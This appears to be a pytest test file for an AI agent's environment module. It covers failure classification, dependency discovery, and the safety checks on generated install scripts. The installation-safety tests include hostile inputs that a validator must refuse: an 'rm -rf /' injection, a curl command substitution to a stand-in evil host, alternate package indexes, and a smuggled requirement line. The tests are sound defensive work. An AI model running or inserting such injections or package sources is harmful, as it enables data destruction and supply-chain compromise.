"""M3.1 Part 2: the environment and dependency foundation.

Three properties are under test, and each one exists because of a specific way the loop has
already been observed to waste a repair budget or mislead a user:

1. **Classification.** A non-zero exit means one of four different things. M2 collapsed all
   four into ``TEST_FAILURE`` and sent the Debugger hunting for a bug in code that had never
   executed.
2. **Discovery.** What a project requires is determined by parsing manifests and imports,
   never by asking a model what it thinks the dependencies are.
3. **Installation artifacts.** Generated text only -- and text that refuses to carry an
   alternate package source, a shell metacharacter, or a system-wide install.

Everything here is deterministic and offline. Nothing in this module installs anything.
"""

from __future__ import annotations

import sys
from pathlib import Path

import pytest

from edith.environment import (
    Dependency,
    DependencyKind,
    DependencyOrigin,
    DependencyStatus,
    Ecosystem,
    EnvironmentSpec,
    UnsafeDependencyError,
    assert_safe,
    classify_failure,
    detect_runtime,
    discover,
    distribution_for,
    find_project_venv,
    find_source_imports,
    generate,
    local_module_names,
    missing_modules,
    parse_pyproject,
    parse_requirements,
    render_manifest,
)
from edith.environment.provision import inspect_project, provision, write_artifacts
from edith.errors import FailureCategory
from edith.policy import FailureAction, rule_for
from edith.schemas.agent import AgentPermissions

from .tool_fixtures import build_gateway


def write(root: Path, relative: str, content: str) -> Path:
    """Create a file, making its parents."""
    path = root / relative
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(content, encoding="utf-8")
    return path


class TestFourWayClassification:
    """The distinction M2 lacked. Each case is real output from a real failure mode."""

    def test_a_missing_test_runner_is_an_environment_failure(self) -> None:
        """The exact misclassification the user called out: missing pytest is not a test."""
        diagnosis = classify_failure(
            "C:\\Python311\\python.exe: No module named pytest\n", exit_code=1
        )
        assert diagnosis.category is FailureCategory.ENVIRONMENT_FAILURE
        assert not diagnosis.code_executed

    def test_a_missing_third_party_package_is_a_dependency_failure(self) -> None:
        output = (
            "ImportError while importing test module 'tests/test_api.py'.\n"
            "tests/test_api.py:3: in <module>\n"
            "    import requests\n"
            "E   ModuleNotFoundError: No module named 'requests'\n"
        )
        diagnosis = classify_failure(output, exit_code=2)
        assert diagnosis.category is FailureCategory.DEPENDENCY_FAILURE
        assert diagnosis.subject == "requests"
        assert not diagnosis.code_executed, "nothing was learned about the code"
        assert "manifest" in diagnosis.remediation

    def test_the_projects_own_missing_module_is_a_code_failure(self) -> None:
        """A project's own broken module must never be sent to a package index."""
        output = "E   ModuleNotFoundError: No module named 'calculator'\n"
        diagnosis = classify_failure(
            output, exit_code=2, local_modules=frozenset({"calculator"})
        )
        assert diagnosis.category is FailureCategory.CODE_FAILURE
        assert diagnosis.subject == "calculator"

    def test_the_same_output_flips_category_with_local_module_knowledge(self) -> None:
        """The only thing separating the two readings is what the project defines."""
        output = "E   ModuleNotFoundError: No module named 'calculator'\n"
        assert classify_failure(output).category is FailureCategory.DEPENDENCY_FAILURE
        assert (
            classify_failure(output, local_modules=frozenset({"calculator"})).category
            is FailureCategory.CODE_FAILURE
        )

    def test_a_syntax_error_is_a_code_failure(self) -> None:
        output = (
            "E     File \"src/calc.py\", line 4\n"
            "E       def add(a, b)\n"
            "E                    ^\n"
            "E   SyntaxError: expected ':'\n"
        )
        assert classify_failure(output, exit_code=2).category is FailureCategory.CODE_FAILURE

    def test_a_failing_assertion_is_a_test_failure(self) -> None:
        output = (
            "    def test_subtract():\n"
            ">       assert subtract(5, 3) == 2\n"
            "E       AssertionError: assert 8 == 2\n"
            "1 failed, 3 passed in 0.12s\n"
        )
        diagnosis = classify_failure(output, exit_code=1)
        assert diagnosis.category is FailureCategory.TEST_FAILURE
        assert diagnosis.code_executed

    def test_an_assertion_wins_over_an_incidental_type_error_in_its_diff(self) -> None:
        """Assertion diffs routinely mention TypeError; that must not hide a real failure."""
        output = (
            "E       AssertionError: assert <TypeError object> == 2\n"
            "1 failed in 0.10s\n"
        )
        assert classify_failure(output).category is FailureCategory.TEST_FAILURE

    def test_an_interpreter_that_never_started_is_an_environment_failure(self) -> None:
        output = "'python' is not recognized as an internal or external command"
        diagnosis = classify_failure(output, exit_code=9009)
        assert diagnosis.category is FailureCategory.ENVIRONMENT_FAILURE
        assert not diagnosis.code_executed

    def test_no_tests_collected_proves_nothing(self) -> None:
        """Exit 5 means nothing ran, so nothing may be claimed about correctness."""
        diagnosis = classify_failure("collected 0 items\n", exit_code=5)
        assert diagnosis.category is FailureCategory.ENVIRONMENT_FAILURE
        assert not diagnosis.code_executed

    def test_a_broken_import_of_a_name_is_a_code_failure(self) -> None:
        output = "E   ImportError: cannot import name 'low_stock' from 'inventory'"
        diagnosis = classify_failure(output, exit_code=2)
        assert diagnosis.category is FailureCategory.CODE_FAILURE
        assert diagnosis.subject == "low_stock"

    def test_every_missing_module_is_reported(self) -> None:
        output = (
            "ModuleNotFoundError: No module named 'requests'\n"
            "ModuleNotFoundError: No module named 'yaml.parser'\n"
        )
        assert missing_modules(output) == ["requests", "yaml"]


class TestClassificationDrivesPolicy:
    """Classification is only worth having if it changes what the loop does next."""

    def test_a_missing_package_is_escalated_not_repaired(self) -> None:
        rule = rule_for(FailureCategory.DEPENDENCY_FAILURE)
        assert rule.action is FailureAction.ESCALATE
        assert not rule.repairable, "the Debugger cannot install a package"
        assert rule.escalate_to_human

    def test_the_projects_own_broken_code_is_repaired(self) -> None:
        assert rule_for(FailureCategory.CODE_FAILURE).action is FailureAction.REPAIR

    def test_a_broken_toolchain_is_escalated(self) -> None:
        assert rule_for(FailureCategory.ENVIRONMENT_FAILURE).action is FailureAction.ESCALATE


class TestRuntimeDetection:
    def test_the_project_venv_is_preferred_over_the_interpreter_running_edith(
        self, tmp_path: Path
    ) -> None:
        """PATH's ``python`` is the least predictable option on Windows and is never used."""
        relative = "Scripts/python.exe" if sys.platform == "win32" else "bin/python"
        venv_python = tmp_path / ".venv" / relative
        venv_python.parent.mkdir(parents=True)
        venv_python.write_bytes(b"")

        assert find_project_venv(tmp_path) == venv_python

    def test_no_venv_falls_back_to_a_known_good_interpreter(self, tmp_path: Path) -> None:
        assert find_project_venv(tmp_path) is None
        info = detect_runtime(tmp_path)
        assert info.available
        assert info.usable
        assert not info.is_project_local
        assert info.version.startswith("3.")
        assert "no project venv" in info.detail

    def test_an_unusable_interpreter_is_reported_rather_than_assumed(
        self, tmp_path: Path
    ) -> None:
        """A venv directory containing a non-executable stub must not be trusted."""
        relative = "Scripts/python.exe" if sys.platform == "win32" else "bin/python"
        stub = tmp_path / ".venv" / relative
        stub.parent.mkdir(parents=True)
        stub.write_text("not an interpreter", encoding="utf-8")

        info = detect_runtime(tmp_path)
        assert not info.available
        assert not info.usable
        assert info.detail


class TestDependencyDiscovery:
    def test_imports_are_found_by_parsing_not_by_regex(self, tmp_path: Path) -> None:
        """A commented-out or quoted import is not a dependency."""
        write(
            tmp_path,
            "app.py",
            "import requests\n"
            "from yaml import safe_load\n"
            "# import tensorflow\n"
            "DOCS = 'import torch'\n",
        )
        found = find_source_imports(tmp_path)
        assert set(found) == {"requests", "yaml"}

    def test_relative_imports_are_never_dependencies(self, tmp_path: Path) -> None:
        write(tmp_path, "pkg/__init__.py", "")
        write(tmp_path, "pkg/api.py", "from . import models\nfrom .util import helper\n")
        assert find_source_imports(tmp_path) == {}

    def test_the_projects_own_modules_are_identified(self, tmp_path: Path) -> None:
        write(tmp_path, "calculator.py", "")
        write(tmp_path, "inventory/__init__.py", "")
        write(tmp_path, "src/edithapp/__init__.py", "")
        names = local_module_names(tmp_path)
        assert {"calculator", "inventory", "edithapp"} <= names

    def test_a_venv_is_never_scanned_for_project_imports(self, tmp_path: Path) -> None:
        write(tmp_path, "app.py", "import requests\n")
        write(tmp_path, ".venv/Lib/site-packages/thing.py", "import tensorflow\n")
        assert "tensorflow" not in find_source_imports(tmp_path)

    def test_requirements_are_parsed_with_their_specifiers(self) -> None:
        parsed = parse_requirements(
            "# a comment\n"
            "\n"
            "requests>=2.31,<3\n"
            "pydantic[email]==2.7.0\n"
            "-r other.txt\n"
            "git+https://example.invalid/pkg.git\n"
        )
        assert parsed == [("requests", ">=2.31,<3"), ("pydantic", "==2.7.0")]

    def test_a_vcs_or_url_requirement_is_not_silently_accepted(self) -> None:
        """An alternate source must never enter the model by accident."""
        assert parse_requirements("git+https://example.invalid/pkg.git\n") == []
        assert parse_requirements("https://example.invalid/pkg.whl\n") == []

    def test_pyproject_runtime_and_optional_dependencies_are_separated(self) -> None:
        runtime, development, requires = parse_pyproject(
            '[project]\n'
            'name = "demo"\n'
            'requires-python = ">=3.11"\n'
            'dependencies = ["httpx>=0.27", "pydantic>=2"]\n'
            '[project.optional-dependencies]\n'
            'dev = ["pytest>=8"]\n'
        )
        assert runtime == [("httpx", ">=0.27"), ("pydantic", ">=2")]
        assert development == [("pytest", ">=8")]
        assert requires == ">=3.11"

    def test_malformed_pyproject_degrades_instead_of_raising(self) -> None:
        assert parse_pyproject("this is not toml [[[") == ([], [], "")

    def test_import_names_map_to_their_distribution_names(self) -> None:
        """``pip install yaml`` installs something unrelated. Guessing here is a real bug."""
        assert distribution_for("yaml") == "PyYAML"
        assert distribution_for("cv2") == "opencv-python"
        assert distribution_for("requests") == "requests"

    def test_an_undeclared_import_is_surfaced(self, tmp_path: Path) -> None:
        """The case that breaks on a fresh machine: used everywhere, declared nowhere."""
        write(tmp_path, "pyproject.toml", '[project]\nname = "demo"\ndependencies = []\n')
        write(tmp_path, "app.py", "import requests\n")

        spec = discover(tmp_path)
        names = {dependency.name: dependency for dependency in spec.dependencies}
        assert "requests" in names
        assert names["requests"].origin is DependencyOrigin.SOURCE_IMPORT
        assert names["requests"].status is DependencyStatus.UNDECLARED
        assert "app.py" in names["requests"].reason

    def test_a_declared_dependency_keeps_its_manifest_provenance(
        self, tmp_path: Path
    ) -> None:
        write(
            tmp_path,
            "pyproject.toml",
            '[project]\nname = "demo"\ndependencies = ["requests>=2.31"]\n',
        )
        write(tmp_path, "app.py", "import requests\n")

        spec = discover(tmp_path)
        dependency = next(d for d in spec.dependencies if d.name == "requests")
        assert dependency.origin is DependencyOrigin.MANIFEST
        assert dependency.requested_version == ">=2.31"

    def test_the_projects_own_modules_are_never_treated_as_packages(
        self, tmp_path: Path
    ) -> None:
        write(tmp_path, "calculator.py", "def add(a, b):\n    return a + b\n")
        write(tmp_path, "app.py", "import calculator\nimport os\n")

        spec = discover(tmp_path)
        assert not any(d.name == "calculator" for d in spec.dependencies)
        assert not any(d.name == "os" for d in spec.dependencies), "stdlib is not a package"

    def test_a_test_only_import_is_classified_as_a_test_dependency(
        self, tmp_path: Path
    ) -> None:
        write(tmp_path, "tests/test_app.py", "import responses\n")
        spec = discover(tmp_path)
        dependency = next(d for d in spec.dependencies if d.name == "responses")
        assert dependency.kind is DependencyKind.TEST


class TestInstallationSafety:
    """Installation is an execution boundary. These are the refusals that enforce it."""

    @pytest.mark.parametrize(
        "specifier", [">=2.31", ">=2.31,<3", "==2.31.0", "~=2.31", "!=2.0,>=1.9"]
    )
    def test_an_ordinary_version_range_is_accepted(self, specifier: str) -> None:
        """Comparison operators are not redirection. Refusing them refuses every manifest."""
        assert_safe(Dependency(name="requests", requested_version=specifier))

    def test_a_shell_metacharacter_in_a_package_name_is_refused(self) -> None:
        with pytest.raises(UnsafeDependencyError):
            assert_safe(Dependency(name="requests; rm -rf /"))

    def test_a_command_substitution_is_refused(self) -> None:
        with pytest.raises(UnsafeDependencyError):
            assert_safe(Dependency(name="requests$(curl evil.invalid)"))

    @pytest.mark.parametrize(
        "specifier",
        ["--index-url https://evil.invalid/simple", "--extra-index-url http://x.invalid"],
    )
    def test_an_alternate_package_source_is_refused(self, specifier: str) -> None:
        """An unapproved index is how a supply-chain substitution gets installed."""
        with pytest.raises(UnsafeDependencyError):
            assert_safe(Dependency(name="requests", requested_version=specifier))

    def test_a_vcs_or_url_dependency_is_refused(self) -> None:
        with pytest.raises(UnsafeDependencyError):
            assert_safe(
                Dependency(name="pkg", requested_version="git+https://evil.invalid/p.git")
            )

    def test_a_newline_cannot_smuggle_a_second_requirement_line(self) -> None:
        with pytest.raises(UnsafeDependencyError):
            assert_safe(
                Dependency(name="requests", requested_version="==2.31.0\nevil-package")
            )

    def test_an_unsafe_entry_stops_the_whole_manifest(self) -> None:
        """Refusal at generation time, not a surprise at install time."""
        spec = EnvironmentSpec(
            dependencies=[
                Dependency(name="requests", resolved_version="2.31.0"),
                Dependency(name="evil", requested_version="--index-url http://x.invalid"),
            ]
        )
        with pytest.raises(UnsafeDependencyError):
            render_manifest(spec)

    def test_an_environment_spec_refuses_to_carry_a_credential(self) -> None:
        """The spec is written to disk and committed; a token reaching it is a leaked token."""
        for key in ("API_KEY", "DB_PASSWORD", "GITHUB_TOKEN", "client_secret"):
            with pytest.raises(ValueError, match="credential"):
                EnvironmentSpec(environment_variables={key: "value"})

    def test_a_non_secret_variable_is_allowed(self) -> None:
        spec = EnvironmentSpec(environment_variables={"LOG_LEVEL": "INFO"})
        assert spec.environment_variables["LOG_LEVEL"] == "INFO"

    def test_environment_variable_values_never_reach_a_generated_script(self) -> None:
        """Install scripts are committed files. Nothing from the environment is baked in."""
        spec = EnvironmentSpec(
            environment_variables={"LOG_LEVEL": "sentinel-value-must-not-appear"},
            dependencies=[Dependency(name="requests", resolved_version="2.31.0")],
        )
        for content in generate(spec).as_files().values():
            assert "sentinel-value-must-not-appear" not in content

    def test_installation_always_reads_the_manifest_never_an_argument_list(self) -> None:
        """A package list assembled at install time is a list nothing reviewed."""
        spec = EnvironmentSpec(
            dependencies=[Dependency(name="requests", resolved_version="2.31.0")]
        )
        files = generate(spec).as_files()
        for name in ("scripts/install.bat", "scripts/install.ps1", "scripts/install.sh"):
            content = files[name]
            installs = [
                line for line in content.splitlines() if "pip install" in line
            ]
            assert installs, name
            for line in installs:
                # Only two forms are permitted: upgrading pip, and installing the manifest.
                assert "-r " in line or "--upgrade pip" in line, line


class TestInstallationArtifacts:
    """Generated text only. Running it goes through the M1 gateway like anything else."""

    @pytest.fixture
    def spec(self) -> EnvironmentSpec:
        return EnvironmentSpec(
            runtime_version="3.11",
            dependencies=[
                Dependency(name="requests", resolved_version="2.31.0", import_name="requests"),
                Dependency(
                    name="PyYAML", resolved_version="6.0.1", import_name="yaml"
                ),
                Dependency(
                    name="pytest", resolved_version="8.2.0", kind=DependencyKind.TEST
                ),
            ],
            verification_imports=["requests", "yaml"],
        )

    def test_the_manifest_pins_what_actually_worked(self, spec: EnvironmentSpec) -> None:
        manifest = render_manifest(spec)
        assert "requests==2.31.0" in manifest
        assert "PyYAML==6.0.1" in manifest

    def test_test_dependencies_are_separated_from_runtime(
        self, spec: EnvironmentSpec
    ) -> None:
        manifest = render_manifest(spec)
        assert manifest.index("requests==") < manifest.index("# Test dependencies")
        assert manifest.index("# Test dependencies") < manifest.index("pytest==")

    def test_every_script_installs_into_a_project_local_environment(
        self, spec: EnvironmentSpec
    ) -> None:
        """The rule that keeps Edith from modifying the user's global Python."""
        artifacts = generate(spec)
        for name, content in artifacts.as_files().items():
            if not name.startswith("scripts/"):
                continue
            assert "venv" in content, name
            assert "--user" not in content, name
            assert "sudo" not in content, name

    def test_every_script_verifies_the_imports_it_installed(
        self, spec: EnvironmentSpec
    ) -> None:
        """The user-visible requirement: no ModuleNotFoundError on first run."""
        artifacts = generate(spec)
        for name in ("scripts/install.bat", "scripts/install.ps1", "scripts/install.sh"):
            content = artifacts.as_files()[name]
            assert "import requests, yaml" in content, name

    def test_every_script_fails_loudly_rather_than_silently(
        self, spec: EnvironmentSpec
    ) -> None:
        files = generate(spec).as_files()
        assert "exit /b 1" in files["scripts/install.bat"]
        assert "exit 1" in files["scripts/install.ps1"]
        assert "set -euo pipefail" in files["scripts/install.sh"]

    def test_the_batch_script_prefers_the_windows_launcher(
        self, spec: EnvironmentSpec
    ) -> None:
        """Bare ``python`` on Windows is often a Store alias that installs nothing."""
        content = generate(spec).as_files()["scripts/install.bat"]
        assert "py -3 --version" in content
        assert content.index("py -3 --version") < content.index("python --version")

    def test_a_missing_python_produces_an_actionable_message(
        self, spec: EnvironmentSpec
    ) -> None:
        content = generate(spec).as_files()["scripts/install.bat"]
        assert "No Python installation was found" in content
        assert "python.org/downloads" in content

    def test_windows_scripts_use_crlf_line_endings(self, spec: EnvironmentSpec) -> None:
        """A ``.bat`` with bare LF endings misbehaves on the target machine."""
        files = generate(spec).as_files()
        assert "\r\n" in files["scripts/install.bat"]
        assert "\r\n" not in files["scripts/install.sh"]

    def test_generation_is_deterministic(self, spec: EnvironmentSpec) -> None:
        """Regenerating an unchanged spec must not produce a diff."""
        assert generate(spec).as_files() == generate(spec).as_files()

    def test_an_unsupported_ecosystem_is_refused_rather_than_approximated(self) -> None:
        with pytest.raises(ValueError, match="only implemented for Python"):
            generate(EnvironmentSpec(ecosystem=Ecosystem.NODE))


class TestArtifactsGoThroughTheGateway:
    """Installers are executable content, so they land on disk through the M1 policy layer.

    Nothing here installs anything. These tests assert the *boundary*: the write is a
    ``filesystem.write`` tool call, subject to the path policy and the agent's write scope,
    and a refusal is reported rather than worked around.
    """

    @pytest.fixture
    def spec(self) -> EnvironmentSpec:
        return EnvironmentSpec(
            runtime_version="3.11",
            dependencies=[Dependency(name="requests", resolved_version="2.31.0")],
            verification_imports=["requests"],
        )

    def test_artifacts_are_written_through_the_tool_gateway(
        self, tmp_path: Path, spec: EnvironmentSpec
    ) -> None:
        gateway = build_gateway(
            tmp_path,
            AgentPermissions(
                allowed_tools=frozenset({"filesystem.write"}),
                allowed_write_paths=("requirements.txt", "scripts/**"),
            ),
        )
        _, outcome = provision(gateway, spec)

        assert outcome.ok, f"denied={outcome.denied} errors={outcome.errors}"
        assert (tmp_path / "requirements.txt").is_file()
        assert (tmp_path / "scripts" / "install.bat").is_file()
        assert (tmp_path / "scripts" / "install.ps1").is_file()
        assert (tmp_path / "scripts" / "install.sh").is_file()

    def test_a_write_outside_the_agents_scope_is_denied_not_bypassed(
        self, tmp_path: Path, spec: EnvironmentSpec
    ) -> None:
        """The generator must never reach past the permission engine to pathlib."""
        gateway = build_gateway(
            tmp_path,
            AgentPermissions(
                allowed_tools=frozenset({"filesystem.write"}),
                # Deliberately excludes scripts/, which the artifacts need.
                allowed_write_paths=("requirements.txt",),
            ),
        )
        _, outcome = provision(gateway, spec)

        assert not outcome.ok
        assert "scripts/install.bat" in outcome.denied
        assert not (tmp_path / "scripts" / "install.bat").exists()

    def test_an_agent_without_the_write_tool_writes_nothing(
        self, tmp_path: Path, spec: EnvironmentSpec
    ) -> None:
        gateway = build_gateway(
            tmp_path,
            AgentPermissions(allowed_tools=frozenset({"filesystem.read"})),
        )
        outcome = write_artifacts(gateway, generate(spec))

        assert not outcome.ok
        assert len(outcome.denied) == 4
        assert not outcome.written
        assert not (tmp_path / "requirements.txt").exists()

    def test_an_unsafe_dependency_stops_generation_before_anything_is_written(
        self, tmp_path: Path
    ) -> None:
        """A rejected manifest must not leave a half-written set of scripts behind."""
        gateway = build_gateway(
            tmp_path,
            AgentPermissions(
                allowed_tools=frozenset({"filesystem.write"}),
                allowed_write_paths=("**",),
            ),
        )
        hostile = EnvironmentSpec(
            dependencies=[
                Dependency(name="requests", requested_version="--index-url http://x.invalid")
            ]
        )
        with pytest.raises(UnsafeDependencyError):
            provision(gateway, hostile)
        assert not (tmp_path / "requirements.txt").exists()
        assert not (tmp_path / "scripts").exists()


class TestProjectInspection:
    def test_an_undeclared_import_is_reported_as_a_note(self, tmp_path: Path) -> None:
        write(tmp_path, "pyproject.toml", '[project]\nname = "demo"\ndependencies = []\n')
        write(tmp_path, "app.py", "import requests\n")

        report = inspect_project(tmp_path)
        assert not report.ready
        assert any("ModuleNotFoundError" in note for note in report.notes)
        assert [d.name for d in report.undeclared] == ["requests"]

    def test_a_missing_project_venv_is_called_out(self, tmp_path: Path) -> None:
        """Silence here is how "works on Edith's machine" ships to a user."""
        write(tmp_path, "pyproject.toml", '[project]\nname = "demo"\ndependencies = []\n')
        report = inspect_project(tmp_path)
        assert any("virtual environment" in note for note in report.notes)

    def test_the_summary_never_claims_more_than_was_checked(self, tmp_path: Path) -> None:
        write(tmp_path, "pyproject.toml", '[project]\nname = "demo"\ndependencies = []\n')
        write(tmp_path, "app.py", "import requests\n")
        summary = inspect_project(tmp_path).summary()
        assert "UNDECLARED" in summary
